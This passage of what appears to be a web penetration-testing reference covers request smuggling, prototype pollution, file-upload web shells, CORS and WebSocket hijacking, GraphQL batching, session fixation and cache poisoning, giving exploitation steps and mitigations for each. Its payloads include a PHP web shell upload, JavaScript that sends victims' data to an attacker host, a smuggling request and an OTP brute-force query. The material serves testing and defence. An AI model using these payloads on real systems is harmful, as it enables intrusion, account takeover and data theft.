exploitationSteps: Once a specific vulnerability type is identified (e.g., CL.TE or TE.CL), craft a smuggling payload that prepends a malicious request to the next legitimate request processed on the same TCP connection.

To achieve a measurable impact without harming other users, target your own requests first. Smuggle a request pointing to an administrative endpoint (e.g., `/admin`) and immediately issue a second, normal request to capture the smuggled response.

Attempt to exploit the vulnerability to capture other users' requests by smuggling a request to an endpoint that reflects input (like a comment field), forcing the back-end to append the next user's HTTP headers (including their session cookie) into your comment.
Thoroughly document the exact header obfuscation required, the front-end/back-end server versions (if identifiable), and the proven impact (e.g., unauthorized access or cache poisoning).

examplePayloads.label: CL.TE Timing Payload (Causes backend to wait for data)
examplePayloads.command:
POST / HTTP/1.1
Host: target-url
Content-Length: 4
Transfer-Encoding: chunked

1
A
X

POST / HTTP/1.1

5e
POST /admin HTTP/1.1

x=1
0

variants: CL.TE: The Front-End uses Content-Length, the Back-End uses Transfer-Encoding.
TE.CL: The Front-End uses Transfer-Encoding, the Back-End uses Content-Length.

TE.TE (Obfuscated): Both servers support Transfer-Encoding, but one server can be tricked into ignoring the header through obfuscation (e.g., `Transfer-Encoding: chunked\r\n`), inducing either CL.TE or TE.CL behavior.
mitigation: The most robust mitigation is to upgrade all front-end to back-end communications to HTTP/2, as HTTP/2 utilizes a binary framing mechanism that entirely eliminates the ambiguity of `Content-Length` and `Transfer-Encoding` boundaries.

If HTTP/1.1 must be maintained, configure the front-end server to strictly normalize ambiguous requests and aggressively drop any request containing conflicting `Content-Length` and `Transfer-Encoding` headers.

Ensure the front-end and back-end servers run identical web server software and versions to guarantee identical parsing logic, or explicitly disable TCP connection reuse (Keep-Alive) between the front-end and back-end, though this incurs a significant performance penalty.

WEB-093.prerequisites: A backend infrastructure built on Node.js (JavaScript). The application must accept user-supplied JSON payloads or URL query parameters and process them using unsafe merging, cloning, or object assignment functions (e.g., flawed deep-copy utilities). Tools like Burp Suite and specialized Node.js payload wordlists are required.
WEB-093.whatItIs: This is a JavaScript-specific attack: an attacker manipulates how the app merges objects together, tricking it into modifying JavaScript's core, shared object blueprint that every object in the app is built from. Once that shared blueprint is polluted with malicious properties, every single object created afterward — across the entire application — inherits those malicious properties too.
WEB-093.rootCause: JavaScript lets objects inherit properties from a shared blueprint. If a function that merges two objects together (a common utility, often from a popular library) doesn't specifically block certain special property names, an attacker can use those names in data they submit to reach into and pollute that shared blueprint directly — corrupting every object built from it afterward, app-wide.
WEB-093.impact: The impact on a server-side Node.js environment is catastrophic. By polluting properties that the application or its dependencies later check (known as 'gadgets'), an attacker can bypass authentication logic (by polluting a default `isAdmin: true` flag), cause widespread Denial of Service (DoS) by breaking core object functions, or achieve Remote Code Execution (RCE) by polluting environment variables or command-execution options (e.g., polluting the `env` or `shell` properties in `child_process.spawn()`).
stepsToIdentify: Identify API endpoints that process complex JSON structures, particularly those involved in updating user profiles, configurations, or performing deep object merging.

Inject benign diagnostic properties into the payload targeting the prototype, such as `{"__proto__": {"zz_pollution_test": "polluted"}}` or `{"constructor": {"prototype": {"zz_pollution_test": "polluted"}}}`.
Send subsequent requests to unrelated endpoints and attempt to reflect or infer the existence of the newly polluted property, confirming global scope pollution.
Monitor the application's error responses; inadvertently polluting core properties (like `toString`) will immediately crash the Node.js thread, confirming vulnerability via Denial of Service.
exploitationSteps: Upon confirming prototype pollution, analyze the application's technology stack (e.g., Express, Handlebars, Pug) to identify known gadget chains.

Craft a targeted payload to escalate privileges. For example, if the application checks `if (user.isAdmin)` but doesn't explicitly define `isAdmin` for standard users, polluting `{"__proto__": {"isAdmin": true}}` will grant administrative rights universally.

To achieve RCE, target the `child_process` module by polluting the `NODE_OPTIONS` environment variable (e.g., injecting `--require` to load a malicious file) or by polluting the `shell` option to redirect command execution to `/bin/bash`.

Document the successful pollution precisely. Exercise extreme caution, as testing for RCE via prototype pollution in a shared Node.js environment can easily result in irreversible application corruption, requiring a full server restart to clear the memory.

examplePayloads.label: Basic payload to test for prototype pollution via JSON parsing
Bypassing __proto__ filters utilizing constructor.prototype

variants: Client-Side Prototype Pollution: Occurs in the browser, typically leading to DOM-based XSS when polluted properties interact with client-side rendering frameworks.
Server-Side Prototype Pollution: Occurs in the Node.js backend, leading to Authentication Bypass, DoS, or full Remote Code Execution via dependency gadget chains.
mitigation: Implement rigorous input validation using JSON schema validation (e.g., Ajv) to strictly define allowed keys, rejecting requests containing unexpected properties like `__proto__` or `constructor`.
Utilize safe object merging strategies. When implementing deep-merge functions, explicitly check for and block the `__proto__` and `constructor` keys before processing the assignment.
Instantiate objects without a prototype when deep merging isn't required by using `Object.create(null)`, neutralizing the inheritance attack vector entirely.

Continuously audit and update third-party Node.js dependencies (especially utility libraries like Lodash) using tools like `npm audit`, as prototype pollution is frequently introduced via insecure upstream dependencies.

WEB-094.prerequisites: Access to a web application feature that permits users to upload files (e.g., profile pictures, document attachments, CSV data imports) directly to the server's filesystem. An intercepting proxy (Burp Suite) is required to manipulate HTTP multipart/form-data boundaries, modify file extensions, and bypass client-side validation logic.
WEB-094.whatItIs: The app lets users upload files without properly checking their name, type, actual content, or size. If uploaded files get saved somewhere the web server will run as code, an attacker can upload a malicious script disguised as an innocent file, then simply visit that file's URL to have the server execute it — giving them the ability to run their own commands on the server.
WEB-094.rootCause: File-type checks rely on things the client can easily fake — like the claimed file type — instead of checking what the file actually contains, or use a list of blocked extensions that misses some dangerous variants. On top of that, uploaded files get saved somewhere publicly accessible with no restriction on whether the server is willing to execute them.
WEB-094.impact: Exploitation grants the attacker a persistent web shell on the target server, leading immediately to Remote Code Execution (RCE). From this foothold, the attacker can thoroughly compromise the web server, exfiltrate sensitive backend data, pivot to attack adjacent internal network infrastructure, or deploy ransomware.
stepsToIdentify: Locate all file upload mechanisms within the application and attempt to upload a benign file (e.g., a standard PNG image) to observe the normal application workflow.
Determine the exact path where the uploaded file is stored and verify if it can be accessed directly via a URL (e.g., `https://<target>/uploads/image.png`).
Attempt to upload a file with an executable extension corresponding to the backend technology (e.g., `shell.php` for Apache/PHP, `shell.jsp` for Tomcat).

If the upload is blocked, systematically attempt bypass techniques: manipulating the `Content-Type` header to `image/jpeg`, using alternative executable extensions (`.php5`, `.phtml`, `.shtml`), double extensions (`shell.jpg.php`), or injecting null bytes (`shell.php%00.jpg` on legacy systems).
exploitationSteps: Craft a minimal, stealthy web shell payload tailored to the backend language (e.g., `<?php system($_GET['cmd']); ?>`).
Utilize the identified bypass technique (e.g., spoofing the MIME type and using a `.phtml` extension) to successfully upload the malicious payload to the server.
Navigate to the direct URL of the uploaded web shell (e.g., `https://<target>/uploads/shell.phtml?cmd=whoami`).
Capture the HTTP response verifying the execution of the injected OS command, confirming RCE.
Document the bypass methodology and immediately remove the web shell to secure the environment post-verification.

examplePayloads.label: Bypassing naive extension and MIME checks via Burp Suite manipulation
examplePayloads.command:
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...

------WebKitFormBoundary...
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php echo shell_exec($_GET['cmd']); ?>
------WebKitFormBoundary--

examplePayloads.label: Executing commands via the successfully uploaded web shell

variants: Direct Code Execution: Uploading a script that is natively executed by the web server (e.g., `.php`, `.jsp`).
Cross-Site Scripting (XSS) via Upload: Uploading a malicious HTML or SVG file containing JavaScript, which executes in the victim's browser when viewed.
XML External Entity (XXE) via Upload: Uploading a malicious XML or SVG file that triggers an XXE vulnerability when parsed by backend image processing libraries.
mitigation: Implement rigorous, server-side whitelist validation of file extensions. Strictly accept only operationally necessary extensions (e.g., strictly `.jpg`, `.png`, `.pdf`) and explicitly reject all others.
Perform deep content inspection and validate the file's 'magic numbers' (file signatures) to verify the actual file type, rather than trusting the user-supplied extension or `Content-Type` header.

Never store uploaded files in a publicly accessible web root directory. Store them in an isolated, non-executable storage container (e.g., an AWS S3 bucket) or a secure backend directory outside the web root, delivering them to users via an authorized application script.

Strip all metadata (e.g., EXIF data) from uploaded images, rename files to randomly generated UUIDs upon upload to prevent directory traversal and collision attacks, and strictly disable execution permissions on the upload directory.

WEB-095.prerequisites: Access to a web application or API that utilizes Cross-Origin Resource Sharing (CORS) to facilitate interactions between different domains. An intercepting proxy like Burp Suite is required to manipulate the `Origin` HTTP header, and the ability to host a malicious HTML/JS file on an external server is required to demonstrate the exploitation of authenticated users.
WEB-095.whatItIs: The server relaxes the browser's normal protection against other websites reading your private data, by automatically trusting whatever website claims to be asking and reflecting that back — while also allowing credentials to be included. That combination lets a malicious website make an authenticated request to this app and actually read the private response.
WEB-095.rootCause: Getting this setting right is genuinely tricky, especially with multiple legitimate subdomains involved. To avoid the hassle, developers often just echo back whatever website is asking instead of checking it against a specific, known list — which completely defeats the protection this setting exists to provide.
WEB-095.impact: Exploiting an insecure CORS policy allows an attacker to bypass the Same-Origin Policy entirely. If a victim visits an attacker-controlled website while holding an active session with the vulnerable application, the attacker's JavaScript can silently issue authenticated requests on the victim's behalf, completely exfiltrating highly sensitive data (e.g., PII, API keys, CSRF tokens, financial details) from the vulnerable application directly to the attacker.
stepsToIdentify: Identify API endpoints or sensitive web pages that process authenticated user data.
Intercept the HTTP request and inject the `Origin: https://attacker.com` header.

Examine the HTTP response. If the server reflects `Access-Control-Allow-Origin: https://attacker.com` AND simultaneously includes `Access-Control-Allow-Credentials: true`, the endpoint is highly vulnerable.

Test for poorly implemented regex filters by submitting modified origins such as `https://vulnerable-app.com.attacker.com` (prefix bypass) or `https://attacker.com%60.vulnerable-app.com` (delimiter bypass).
Test if the server blindly accepts the literal string `null` as an origin (`Origin: null`), which can be generated by sandboxed iframes.
exploitationSteps: Construct a malicious HTML page containing a JavaScript payload utilizing the `fetch()` API or `XMLHttpRequest` with the `credentials: 'include'` flag explicitly set.
Configure the payload to silently request the vulnerable authenticated endpoint (e.g., `/api/user_profile`).
Embed logic in the payload to capture the JSON/HTML response data and exfiltrate it via a secondary request back to the attacker's controlled logging server.
Host the malicious page and simulate a victim interaction (while authenticated in a separate tab) to conclusively demonstrate the unauthorized cross-origin data theft.
Document the exact request and response headers that validate the flaw, accompanied by the proof-of-concept exploit code.

examplePayloads.label: Identifying permissive CORS reflection via curl
examplePayloads.command:
curl -H "Origin: https://malicious-site.com" -I https://<target-url>/api/sensitive_data
# Look for ACAO: https://malicious-site.com and ACAC: true in the response

examplePayloads.label: Malicious JavaScript payload to exfiltrate authenticated data via insecure CORS
examplePayloads.command:
<script>
fetch('https://<target-url>/api/profile', {
  credentials: 'include'
})
.then(response => response.text())
.then(data => {
  fetch('https://<attacker-ip>/log', { method: 'POST', body: data });
});
</script>

variants: Arbitrary Origin Reflection: The server blindly echoes any submitted origin string in the ACAO header.
Null Origin Trust: The server explicitly whitelists the `null` origin, which attackers can easily generate via `<iframe sandbox="allow-scripts">`.
Pre-domain or Post-domain Wildcarding: Flawed regex allows origins like `https://target.attacker.com` or `https://attacker.com/target.com`.
mitigation: Strictly configure the CORS policy to rely on a hardcoded, explicitly maintained whitelist of trusted domains. Never dynamically reflect the `Origin` header supplied by the client.

Never utilize the wildcard character (`*`) in conjunction with `Access-Control-Allow-Credentials: true`, as this is explicitly forbidden by modern browser specifications; however, dynamically echoing the origin acts as a functional bypass to this rule and must be avoided.
Do not whitelist the `null` origin. While it may seem restrictive, it is easily manipulated by attackers using sandboxed iframes to bypass origin checks.

Implement rigorous, anchor-bound regular expressions when validating origins to prevent prefix and suffix manipulation attacks (e.g., ensuring `^https://trusted\.com$` is used rather than `trusted\.com`).

WEB-096.prerequisites: Access to an application utilizing a GraphQL API endpoint (commonly located at `/graphql`, `/v1/graphql`, or `/api/graphql`). Standard HTTP interception tools (Burp Suite) and dedicated GraphQL exploration tools such as GraphQL Voyager or Altair are necessary to parse and visualize the extracted schema.
WEB-096.whatItIs: GraphQL APIs commonly have two related weaknesses. First, a built-in feature called 'introspection' lets anyone ask the API to describe its entire structure — every available action and data type — handing an attacker a complete map with zero guesswork. Second, GraphQL lets many operations be bundled into a single request, which an attacker can abuse to try hundreds of password guesses in one request, completely sailing past a rate limit that only counts individual requests.
WEB-096.rootCause: Introspection is usually turned on by default to help developers during development, and it's easy to forget to switch it off before going live. And because GraphQL is specifically designed to let a client request many things in one round-trip (which is genuinely useful), it's common for there to be no limit on how many operations, or how complex a single request, can actually be.
WEB-096.impact: Open Introspection completely eliminates the attacker's reconnaissance burden, providing a comprehensive, self-documenting map of the entire API structure, frequently revealing hidden administrative mutations or deprecated endpoints containing vulnerabilities. Alias Batching allows an attacker to execute highly efficient, localized brute-force attacks (e.g., attempting 1,000 MFA tokens or passwords in a single HTTP request), entirely bypassing WAF rules that only monitor request frequency.
stepsToIdentify: Locate the GraphQL endpoint by observing application traffic or brute-forcing common endpoints (`/graphql`).
Submit a standard Introspection query (`{ __schema { types { name } } }`) to the endpoint. If the server responds with the schema structure, Introspection is misconfigured and open.

Attempt a batching/alias test by submitting a single HTTP request containing multiple aliases for the same query (e.g., requesting the profiles of `user1` and `user2` simultaneously using `alias1: getUser(id:1) alias2: getUser(id:2)`).
Observe the response; if the API resolves and returns all aliases within the single JSON response, the endpoint is susceptible to batching abuse.
exploitationSteps: Extract the full schema using a comprehensive Introspection query. Import the resulting JSON into GraphQL Voyager to visualize the data graph and identify sensitive mutations (e.g., `updateUserRole`, `deleteAccount`).

Construct an Alias Batching payload designed to bypass rate limiting. For example, construct a single POST request containing 500 aliases of a `login` mutation, each attempting a different password against a target account.
Analyze the response to identify the successful login attempt among the 500 results, proving the brute-force mitigation bypass.

Attempt to construct a deeply nested, circular query (e.g., User -> Posts -> Author -> Posts) to test for Denial of Service via computational exhaustion, but abort the request immediately upon confirming the lack of depth limiting.

examplePayloads.label: Verifying Open Introspection exposure
examplePayloads.command: curl -X POST -H "Content-Type: application/json" -d '{"query": "{ __schema { queryType { name } mutationType { name } } }"}' https://<target-url>/graphql

examplePayloads.label: Alias Batching payload for brute-forcing an OTP code in a single HTTP request
examplePayloads.command: curl -X POST -H "Content-Type: application/json" -d '{"query": "mutation { attempt1: verifyOTP(code: \"0001\") { success } attempt2: verifyOTP(code: \"0002\") { success } attempt3: verifyOTP(code: \"0003\") { success } }"}' https://<target-url>/graphql

variants: Open Introspection: Information disclosure revealing the entire API architecture and hidden endpoints.
Alias/Array Batching: Bypassing rate limits by encapsulating hundreds of actions within a single HTTP request.
Query Depth/Cost Exhaustion (DoS): Crafting deeply nested relational queries that consume massive amounts of CPU and database resources on the backend.
mitigation: Explicitly disable GraphQL Introspection in all production environments. This prevents attackers from easily mapping the attack surface.
Implement rigorous Query Depth Limiting and Query Cost Analysis. Reject any query that exceeds a predefined threshold of nesting or computational complexity to prevent DoS attacks.

Implement rate limiting at the GraphQL resolver level, not just the HTTP gateway level. The application must track and limit the number of specific operations (e.g., login attempts) executed within a single batch, successfully neutralizing Alias-based brute forcing.

WEB-097.prerequisites: Access to the web application's authentication workflow. The ability to intercept and modify HTTP responses and requests using Burp Suite. The capability to establish concurrent sessions (e.g., using two different browsers or incognito mode) to test session lifecycle management.
WEB-097.whatItIs: This covers serious flaws in how login sessions are managed. The most notable: the app accepts a session ID that existed before someone even logged in, and then keeps using that exact same ID once they do log in — meaning an attacker who planted that session ID on the victim beforehand can hijack the account the instant the victim logs in.
WEB-097.rootCause: The app doesn't generate a brand new session ID at the exact moment someone's access level changes, like right after login. Broader issues in the same category include predictable session IDs, sessions that don't actually get invalidated on the server when someone logs out, or session cookies missing basic protective flags.
WEB-097.impact: Exploiting these flaws results directly in Account Takeover. An attacker can completely bypass the authentication process by hijacking a victim's active session, granting them immediate, unfettered access to the victim's sensitive data, financial capabilities, and application privileges, entirely nullifying password and MFA controls.
stepsToIdentify: Visit the application unauthenticated and observe the initial session identifier assigned by the server (e.g., `PHPSESSID` or `JSESSIONID`).
Proceed to authenticate with valid credentials while intercepting the request.

Observe the HTTP response following successful authentication. Check if the server issues a completely new session identifier (via a `Set-Cookie` header), or if it continues utilizing the pre-authentication session ID. If it does not rotate, the application is vulnerable to Session Fixation.

Test for Improper Logout: log into the application, capture a request utilizing the valid session ID, click 'Logout' in the UI, and then replay the captured request via Burp Suite Repeater. If the server still honors the request, session termination is purely client-side, and the server-side session remains dangerously valid.
exploitationSteps: To exploit Session Fixation, establish an anonymous session with the application and extract the session cookie.

Lure the victim to the application by forcing this known session ID onto their browser (e.g., via a reflected XSS vulnerability, HTTP response splitting, or if the application insecurely accepts session IDs via URL parameters like `?JSESSIONID=1234`).
Wait for the victim to authenticate normally. Because the application fails to rotate the ID, the session ID known to the attacker is now tied to the victim's authenticated state.
Navigate to the application utilizing the known session ID to successfully hijack the victim's account without requiring their credentials.
Document the failure in session rotation and any missing cookie security flags.

examplePayloads.label: Testing for Session Fixation via URL parameter (if supported by legacy frameworks)
Testing server-side session termination (Replaying post-logout request via curl)
examplePayloads.command:
curl -X GET -H "Cookie: session=OLD_LOGGED_OUT_SESSION_ID" https://<target-url>/api/sensitive_data
# If data is returned, logout is improperly implemented.

variants: Session Fixation: The attacker pre-determines the session ID before the victim logs in.
Inadequate Logout: The application destroys the cookie in the browser but fails to invalidate the session token on the backend server, allowing indefinite reuse.
Missing Cookie Flags: The session cookie lacks the `HttpOnly` flag (allowing theft via XSS) or the `Secure` flag (allowing transmission in plaintext over unencrypted HTTP).
mitigation: Strictly mandate session identifier regeneration immediately upon any change in authentication state. The application must explicitly discard the anonymous session ID and issue a cryptographically strong, entirely new session ID upon successful login.
Ensure the 'Logout' function explicitly destroys the session object on the backend server, rendering the session ID permanently invalid, in addition to instructing the client to delete the cookie.
Utilize modern web frameworks for session management rather than custom implementations to ensure high entropy and unpredictability of session IDs.
Enforce strict cookie security attributes: `Secure` (to guarantee transmission only over TLS), `HttpOnly` (to strictly prevent client-side JavaScript access), and `SameSite` (to mitigate CSRF).

WEB-098.prerequisites: Access to a web application that implements WebSockets (`ws://` or `wss://`) for real-time bidirectional communication, and relies solely on ambient browser credentials (like session cookies) to authenticate the WebSocket handshake. The attacker requires a controlled external server to host the malicious exploitation payload.
WEB-098.whatItIs: This is CSRF's less well-known cousin, applied to WebSockets (a way for a page to keep an open, live connection to a server). If the server doesn't check where a WebSocket connection request is actually coming from, a malicious website can open a live connection to the target app on the victim's behalf — since the browser automatically attaches the victim's session cookie to that connection too.
WEB-098.rootCause: WebSockets aren't automatically protected by the same cross-site protection that normal page loads get, and developers often mistakenly assume they are. The server only checks the session cookie to confirm who's connecting, without also checking that the request is actually coming from a trusted website, and without any extra, unpredictable value confirming the connection was genuinely intended.
WEB-098.impact: CSWSH is significantly more devastating than standard CSRF. While traditional CSRF is a 'one-way' attack (the attacker can issue a state-changing request but cannot read the response), an established WebSocket provides a bidirectional, persistent communication channel. The attacker can both send unauthorized commands disguised as the victim AND silently capture the continuous stream of sensitive data returned by the server, leading to severe data exfiltration and complete account compromise.
stepsToIdentify: Identify functionality within the application relying on WebSockets (e.g., real-time chat, live notifications, trading dashboards) by observing `101 Switching Protocols` responses in Burp Suite.

Capture the initial HTTP upgrade request and verify that the application relies on session cookies (rather than custom authentication headers or tokens within the WebSocket message frame) for authentication.
Send the HTTP upgrade request to Burp Repeater. Modify the `Origin` header to an arbitrary external domain (e.g., `https://attacker.com`).
If the server accepts the modified request and responds with a `101 Switching Protocols` status, the endpoint is highly susceptible to CSWSH.
exploitationSteps: Construct a malicious HTML page containing a JavaScript payload that programmatically initiates a WebSocket connection (`new WebSocket('wss://<target-url>/socket')`) to the vulnerable endpoint.
Because the browser automatically attaches the victim's session cookie, the socket will authenticate successfully when the victim visits the attacker's page.
Implement event listeners (`socket.onmessage`) within the malicious script to capture any sensitive data streamed from the server and exfiltrate it back to the attacker's logging infrastructure.
Optionally, implement logic to push malicious commands through the hijacked socket (e.g., `socket.send('{"action":"transfer_funds"}')`).
Host the payload, simulate a victim interaction, and document the successfully established bidirectional channel and exfiltrated data.

examplePayloads.label: Identifying missing Origin validation via curl during the upgrade handshake
examplePayloads.command: curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Host: <target-url>" -H "Origin: https://malicious.com" -H "Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==" -H "Sec-WebSocket-Version: 13" -H "Cookie: session=VALID_SESSION" https://<target-url>/chat-socket

examplePayloads.label: Malicious JavaScript payload to hijack the WebSocket and exfiltrate data
examplePayloads.command:
<script>
  var ws = new WebSocket('wss://<target-url>/ws');
  ws.onopen = function() { ws.send('{"command":"get_private_data"}'); };
  ws.onmessage = function(event) {
    fetch('https://<attacker-ip>/log', {method: 'POST', body: event.data});
  };
</script>

variants: Read-Only Hijacking: The attacker utilizes the hijacked socket solely to eavesdrop on sensitive, real-time data streams intended for the victim.
Full Bidirectional Hijacking: The attacker both reads sensitive data and actively pushes malicious, state-changing commands through the authenticated socket.
mitigation: Vigorously validate the `Origin` header during the initial HTTP upgrade handshake. The server must explicitly reject any WebSocket connection attempt originating from an untrusted or unexpected domain with a `403 Forbidden` response.

Implement explicit, request-specific anti-CSRF tokens. The client should retrieve a cryptographically secure, unguessable token via a standard HTTP request and include it as a query parameter in the WebSocket connection URL (e.g., `wss://host/ws?token=UNGUESSABLE`), or pass it in the first message frame post-connection.

Transition away from relying solely on ambient credentials (cookies) for WebSocket authentication. Instead, require the client to pass a robust authentication artifact (like a JWT) explicitly within the first message transmitted over the newly established socket.

WEB-100.prerequisites: A web application deployed behind a caching layer (e.g., a Content Delivery Network like Cloudflare or Akamai, or a backend cache like Varnish or Redis). The application must dynamically reflect unkeyed user input (such as HTTP headers or query parameters) into its HTTP responses. Burp Suite Professional, utilizing the Param Miner extension, is critical for identifying unkeyed inputs efficiently.
WEB-100.whatItIs: An attacker tricks a caching system (something that saves and reuses copies of pages to speed things up) into saving a manipulated, malicious version of a page. Since the cache then serves that same saved copy to every other visitor requesting that page, the attacker's payload spreads to potentially thousands of real users without ever contacting them directly.
WEB-100.rootCause: Caches decide whether two requests are 'the same' based only on certain parts of the request, usually the URL — but the app itself sometimes reacts to other details the cache ignores, like a specific header. If the app unsafely reflects one of those ignored details into the page, the cache saves that manipulated result under the normal URL and serves it to everyone, with no idea anything was tampered with.
WEB-100.impact: The impact of Cache Poisoning is typically the mass delivery of Cross-Site Scripting (XSS) payloads. By poisoning a frequently accessed page (like the homepage), an attacker guarantees execution of their JavaScript payload across the entire user base visiting that page, leading to massive session hijacking or malware distribution. It can also be leveraged for Denial of Service (DoS) by forcing the cache to store an erroneous response (like a 404 or 500 error) for a critical resource.
stepsToIdentify: Identify endpoints that are actively cached by examining HTTP response headers (e.g., `X-Cache: HIT`, `Cache-Control: public, max-age=...`).

Utilize the Param Miner extension in Burp Suite to automatically 'guess' and inject hundreds of common unkeyed headers (e.g., `X-Forwarded-Host`, `X-Forwarded-Scheme`) and observe if they alter the application's response.
Once an unkeyed input is found to reflect in the response (e.g., `X-Forwarded-Host` dictates the domain of a loaded `.js` file), verify that the manipulation occurs without altering the cache key.

To safely confirm the vulnerability without affecting other users, append a unique cache-buster parameter (e.g., `?cb=12345`) to the URL. This forces the cache to create an isolated entry exclusively for your testing session.
exploitationSteps: Craft a malicious payload utilizing the identified unkeyed input (e.g., setting `X-Forwarded-Host: attacker.com` to force the application to load a malicious script).
Send the crafted request continuously to the target URL (with a cache-buster applied) until the caching layer registers a `HIT`, indicating the poisoned response has been stored.
Remove the unkeyed header and send a standard request to the cache-busted URL to definitively verify that the cache is actively serving the poisoned response.

Document the specific unkeyed input, the cache behavior, and the execution context. Do NOT attempt to poison the production URL (without the cache-buster) during an assessment, as it will disrupt legitimate user traffic.

examplePayloads.label: Identifying unkeyed reflection of X-Forwarded-Host via curl (utilizing a cache-buster)
examplePayloads.command:
curl -i -H "X-Forwarded-Host: malicious-domain.com" https://<target-url>/?cb=test12345
# Inspect the response to see if malicious-domain.com is reflected in the HTML.

examplePayloads.label: Triggering Cache Poisoning to induce a Denial of Service (Serving a 404 page)
examplePayloads.command:
curl -i -H "X-Original-URL: /non_existent_path" https://<target-url>/?cb=dos_test
# If the cache stores the 404 response for the root path, caching is flawed.

variants: Unkeyed Header Poisoning: Manipulating headers like `X-Forwarded-Host` to inject malicious script sources.
Unkeyed Query Parameter Poisoning: Manipulating UTM tracking parameters or specific query strings that the cache ignores but the application processes.

Cache Deception: Tricking the cache into storing a sensitive, authenticated response (like an API profile page) by appending a static extension (e.g., `profile.js`), making the data accessible to the attacker.
